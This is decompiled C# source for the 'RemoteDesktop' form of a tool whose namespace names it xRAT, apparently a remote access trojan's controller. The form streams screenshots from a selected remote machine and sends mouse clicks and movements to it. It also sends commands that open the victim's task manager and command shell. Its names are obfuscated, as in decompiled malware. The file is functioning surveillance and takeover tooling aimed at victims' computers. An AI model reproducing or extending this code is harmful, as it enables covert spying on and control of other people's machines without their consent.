namespace xRAT
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class RemoteDesktop : Form
    {
        [AccessedThroughProperty("Button3")]
        private Button _Button3;
        [AccessedThroughProperty("ComboBox1")]
        private ComboBox _ComboBox1;
        [AccessedThroughProperty("exitbtn")]
        private Button _exitbtn;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("NumericUpDown1")]
        private NumericUpDown _NumericUpDown1;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("RadioButton1")]
        private RadioButton _RadioButton1;
        [AccessedThroughProperty("RadioButton2")]
        private RadioButton _RadioButton2;
        [AccessedThroughProperty("startbtn")]
        private Button _startbtn;
        [AccessedThroughProperty("stopbtn")]
        private Button _stopbtn;
        private IContainer icontainer_0;
        [AccessedThroughProperty("OpenFileDialog1")]
        private OpenFileDialog openFileDialog_0;
        [AccessedThroughProperty("Timer1")]
        private Timer timer_0;

        public RemoteDesktop()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.RemoteDesktop_Load);
            base.FormClosing += new FormClosingEventHandler(this.RemoteDesktop_FormClosing);
            this.InitializeComponent();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            TextBox box = new TextBox();
            this.OpenFileDialog1.ShowDialog();
            box.Text = this.OpenFileDialog1.FileName;
            this.PictureBox1.Image.Save(box.Text);
        }

        private void daxawBwCf(object sender, EventArgs e)
        {
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void exitbtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.icontainer_0 = new System.ComponentModel.Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(RemoteDesktop));
            this.Timer1 = new Timer(this.icontainer_0);
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.NumericUpDown1 = new NumericUpDown();
            this.Label3 = new Label();
            this.ComboBox1 = new ComboBox();
            this.Label4 = new Label();
            this.OpenFileDialog1 = new OpenFileDialog();
            this.RadioButton1 = new RadioButton();
            this.RadioButton2 = new RadioButton();
            this.Button3 = new Button();
            this.stopbtn = new Button();
            this.startbtn = new Button();
            this.exitbtn = new Button();
            this.PictureBox1 = new PictureBox();
            this.NumericUpDown1.BeginInit();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            this.Timer1.Interval = 0x7d0;
            this.Label1.AutoSize = true;
            Point point = new Point(0x102, 9);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            Size size = new Size(0x4f, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 1;
            this.Label1.Text = "Refresh every ";
            this.Label2.AutoSize = true;
            point = new Point(0x182, 9);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(50, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 2;
            this.Label2.Text = "seconds.";
            point = new Point(340, 7);
            this.NumericUpDown1.Location = point;
            decimal num = new decimal(new int[] { 10, 0, 0, 0 });
            this.NumericUpDown1.Maximum = num;
            num = new decimal(new int[] { 1, 0, 0, 0 });
            this.NumericUpDown1.Minimum = num;
            this.NumericUpDown1.Name = "NumericUpDown1";
            this.NumericUpDown1.ReadOnly = true;
            size = new Size(40, 0x15);
            this.NumericUpDown1.Size = size;
            this.NumericUpDown1.TabIndex = 3;
            num = new decimal(new int[] { 2, 0, 0, 0 });
            this.NumericUpDown1.Value = num;
            this.Label3.AutoSize = true;
            point = new Point(0x23b, 10);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(0x36, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 7;
            this.Label3.Text = "Size: 0 KB";
            this.ComboBox1.FormattingEnabled = true;
            this.ComboBox1.Items.AddRange(new object[] { "5", "10", "30", "70", "100" });
            point = new Point(0x1fc, 7);
            this.ComboBox1.Location = point;
            this.ComboBox1.Name = "ComboBox1";
            size = new Size(0x30, 0x15);
            this.ComboBox1.Size = size;
            this.ComboBox1.TabIndex = 8;
            this.ComboBox1.Text = "10";
            this.Label4.AutoSize = true;
            point = new Point(0x1c9, 10);
            this.Label4.Location = point;
            this.Label4.Name = "Label4";
            size = new Size(0x2d, 13);
            this.Label4.Size = size;
            this.Label4.TabIndex = 9;
            this.Label4.Text = "Quality:";
            this.OpenFileDialog1.CheckFileExists = false;
            this.OpenFileDialog1.FileName = "Screenshoot";
            this.RadioButton1.AutoSize = true;
            this.RadioButton1.Checked = true;
            point = new Point(0x108, 30);
            this.RadioButton1.Location = point;
            this.RadioButton1.Name = "RadioButton1";
            size = new Size(0xb3, 0x11);
            this.RadioButton1.Size = size;
            this.RadioButton1.TabIndex = 13;
            this.RadioButton1.TabStop = true;
            this.RadioButton1.Text = "Enable Mouse/Keyboard Control";
            this.RadioButton1.UseVisualStyleBackColor = true;
            this.RadioButton2.AutoSize = true;
            point = new Point(0x1cf, 30);
            this.RadioButton2.Location = point;
            this.RadioButton2.Name = "RadioButton2";
            size = new Size(0xb5, 0x11);
            this.RadioButton2.Size = size;
            this.RadioButton2.TabIndex = 14;
            this.RadioButton2.Text = "Disable Mouse/Keyboard Control";
            this.RadioButton2.UseVisualStyleBackColor = true;
            this.Button3.Dock = DockStyle.Bottom;
            this.Button3.Image = Class5.smethod_66();
            point = new Point(0, 0x1a1);
            this.Button3.Location = point;
            this.Button3.Name = "Button3";
            size = new Size(0x2a0, 0x2f);
            this.Button3.Size = size;
            this.Button3.TabIndex = 12;
            this.Button3.Text = "Save Picture";
            this.Button3.TextAlign = ContentAlignment.MiddleRight;
            this.Button3.TextImageRelation = TextImageRelation.ImageBeforeText;
            this.Button3.UseVisualStyleBackColor = true;
            this.stopbtn.Image = Class5.smethod_67();
            point = new Point(0x5d, 5);
            this.stopbtn.Location = point;
            this.stopbtn.Name = "stopbtn";
            size = new Size(0x4b, 0x29);
            this.stopbtn.Size = size;
            this.stopbtn.TabIndex = 6;
            this.stopbtn.Text = "Stop";
            this.stopbtn.TextAlign = ContentAlignment.MiddleRight;
            this.stopbtn.TextImageRelation = TextImageRelation.ImageBeforeText;
            this.stopbtn.UseVisualStyleBackColor = true;
            this.startbtn.Image = Class5.smethod_83();
            point = new Point(12, 5);
            this.startbtn.Location = point;
            this.startbtn.Name = "startbtn";
            size = new Size(0x4b, 0x29);
            this.startbtn.Size = size;
            this.startbtn.TabIndex = 5;
            this.startbtn.Text = "Start";
            this.startbtn.TextImageRelation = TextImageRelation.ImageBeforeText;
            this.startbtn.UseVisualStyleBackColor = true;
            this.exitbtn.Image = Class5.smethod_85();
            point = new Point(0xae, 5);
            this.exitbtn.Location = point;
            this.exitbtn.Name = "exitbtn";
            size = new Size(0x4e, 0x29);
            this.exitbtn.Size = size;
            this.exitbtn.TabIndex = 4;
            this.exitbtn.Text = "Close";
            this.exitbtn.TextAlign = ContentAlignment.MiddleRight;
            this.exitbtn.TextImageRelation = TextImageRelation.ImageBeforeText;
            this.exitbtn.UseVisualStyleBackColor = true;
            this.PictureBox1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.PictureBox1.BackColor = Color.White;
            this.PictureBox1.BorderStyle = BorderStyle.FixedSingle;
            point = new Point(0, 0x34);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x2a0, 370);
            this.PictureBox1.Size = size;
            this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0x2a0, 0x1d0);
            this.ClientSize = size;
            this.Controls.Add(this.RadioButton2);
            this.Controls.Add(this.RadioButton1);
            this.Controls.Add(this.Label4);
            this.Controls.Add(this.Button3);
            this.Controls.Add(this.ComboBox1);
            this.Controls.Add(this.stopbtn);
            this.Controls.Add(this.startbtn);
            this.Controls.Add(this.NumericUpDown1);
            this.Controls.Add(this.exitbtn);
            this.Controls.Add(this.Label3);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.PictureBox1);
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "RemoteDesktop";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Remote Desktop";
            this.NumericUpDown1.EndInit();
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void method_0(object sender, MouseEventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                string str = this.PictureBox1.Size.ToString();
                double num = ((double) e.X) / ((double) Convert.ToInt32(str.Substring(7, str.IndexOf(",") - 7)));
                double num2 = ((double) e.Y) / ((double) Convert.ToInt32(str.Substring(str.IndexOf(",") + 9).Trim(new char[] { '}' })));
                if (e.Button == MouseButtons.Left)
                {
                    Class2.Class4_0.method_6().SendToSelected("LClickDown|" + num.ToString() + "|" + num2.ToString());
                }
                else if (e.Button == MouseButtons.Right)
                {
                    Class2.Class4_0.method_6().SendToSelected("RClickDown|" + num.ToString() + "|" + num2.ToString());
                }
            }
        }

        private void method_1(object sender, MouseEventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                string str = this.PictureBox1.Size.ToString();
                double num = ((double) e.X) / ((double) Convert.ToInt32(str.Substring(7, str.IndexOf(",") - 7)));
                double num2 = ((double) e.Y) / ((double) Convert.ToInt32(str.Substring(str.IndexOf(",") + 9).Trim(new char[] { '}' })));
                Class2.Class4_0.method_6().SendToSelected("MoveMouse|" + num.ToString() + "|" + num2.ToString());
            }
        }

        private void method_2(object sender, MouseEventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                string str = this.PictureBox1.Size.ToString();
                double num = ((double) e.X) / ((double) Convert.ToInt32(str.Substring(7, str.IndexOf(",") - 7)));
                double num2 = ((double) e.Y) / ((double) Convert.ToInt32(str.Substring(str.IndexOf(",") + 9).Trim(new char[] { '}' })));
                if (e.Button == MouseButtons.Left)
                {
                    Class2.Class4_0.method_6().SendToSelected("LClickUp|" + num.ToString() + "|" + num2.ToString());
                }
                else if (e.Button == MouseButtons.Right)
                {
                    Class2.Class4_0.method_6().SendToSelected("RClickUp|" + num.ToString() + "|" + num2.ToString());
                }
            }
        }

        private void method_3(object sender, EventArgs e)
        {
            Class2.Class4_0.method_6().SendToSelected("OPtaskio");
        }

        private void method_4(object sender, EventArgs e)
        {
            Class2.Class4_0.method_6().SendToSelected("OPcmdio");
        }

        private void NumericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            this.Timer1.Interval = Convert.ToInt32(decimal.Multiply(this.NumericUpDown1.Value, 1000M));
        }

        private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.Timer1.Enabled = false;
            this.startbtn.Enabled = true;
            this.stopbtn.Enabled = false;
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                Point point = new Point(0x29c, 0x1fa);
                this.MinimumSize = (Size) point;
                this.Timer1.Enabled = true;
                this.startbtn.Enabled = false;
                this.stopbtn.Enabled = true;
                this.PictureBox1.Image = null;
                Class2.Class4_0.method_6().SendToSelected("REMOTEDESK|" + this.ComboBox1.Text);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                MessageBox.Show("The Quality or the number of picture by time is too hight", "Remote Desktop", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                ProjectData.ClearProjectError();
            }
        }

        private void startbtn_Click(object sender, EventArgs e)
        {
            try
            {
                this.Timer1.Enabled = true;
                this.startbtn.Enabled = false;
                this.stopbtn.Enabled = true;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                MessageBox.Show("The Quality or the number of picture by time is too hight", "Remote Desktop", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                ProjectData.ClearProjectError();
            }
        }

        private void stopbtn_Click(object sender, EventArgs e)
        {
            this.Timer1.Enabled = false;
            this.startbtn.Enabled = true;
            this.stopbtn.Enabled = false;
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            Class2.Class4_0.method_6().SendToSelected("REMOTEDESK|" + this.ComboBox1.Text);
        }

        internal virtual Button Button3
        {
            get
            {
                return this._Button3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button3_Click);
                if (this._Button3 != null)
                {
                    this._Button3.Click -= handler;
                }
                this._Button3 = value;
                if (this._Button3 != null)
                {
                    this._Button3.Click += handler;
                }
            }
        }

        internal virtual ComboBox ComboBox1
        {
            get
            {
                return this._ComboBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ComboBox1 = value;
            }
        }

        internal virtual Button exitbtn
        {
            get
            {
                return this._exitbtn;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.exitbtn_Click);
                if (this._exitbtn != null)
                {
                    this._exitbtn.Click -= handler;
                }
                this._exitbtn = value;
                if (this._exitbtn != null)
                {
                    this._exitbtn.Click += handler;
                }
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this._Label3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label3 = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return this._Label4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label4 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown1
        {
            get
            {
                return this._NumericUpDown1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.NumericUpDown1_ValueChanged);
                if (this._NumericUpDown1 != null)
                {
                    this._NumericUpDown1.ValueChanged -= handler;
                }
                this._NumericUpDown1 = value;
                if (this._NumericUpDown1 != null)
                {
                    this._NumericUpDown1.ValueChanged += handler;
                }
            }
        }

        internal virtual OpenFileDialog OpenFileDialog1
        {
            get
            {
                return this.openFileDialog_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.openFileDialog_0 = value;
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                MouseEventHandler handler = new MouseEventHandler(this.method_1);
                MouseEventHandler handler2 = new MouseEventHandler(this.method_0);
                MouseEventHandler handler3 = new MouseEventHandler(this.method_2);
                if (this._PictureBox1 != null)
                {
                    this._PictureBox1.MouseMove -= handler;
                    this._PictureBox1.MouseDown -= handler2;
                    this._PictureBox1.MouseUp -= handler3;
                }
                this._PictureBox1 = value;
                if (this._PictureBox1 != null)
                {
                    this._PictureBox1.MouseMove += handler;
                    this._PictureBox1.MouseDown += handler2;
                    this._PictureBox1.MouseUp += handler3;
                }
            }
        }

        internal virtual RadioButton RadioButton1
        {
            get
            {
                return this._RadioButton1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RadioButton1 = value;
            }
        }

        internal virtual RadioButton RadioButton2
        {
            get
            {
                return this._RadioButton2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RadioButton2 = value;
            }
        }

        internal virtual Button startbtn
        {
            get
            {
                return this._startbtn;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.startbtn_Click);
                if (this._startbtn != null)
                {
                    this._startbtn.Click -= handler;
                }
                this._startbtn = value;
                if (this._startbtn != null)
                {
                    this._startbtn.Click += handler;
                }
            }
        }

        internal virtual Button stopbtn
        {
            get
            {
                return this._stopbtn;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.stopbtn_Click);
                if (this._stopbtn != null)
                {
                    this._stopbtn.Click -= handler;
                }
                this._stopbtn = value;
                if (this._stopbtn != null)
                {
                    this._stopbtn.Click += handler;
                }
            }
        }

        internal virtual Timer Timer1
        {
            get
            {
                return this.timer_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Timer1_Tick);
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick -= handler;
                }
                this.timer_0 = value;
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick += handler;
                }
            }
        }
    }
}

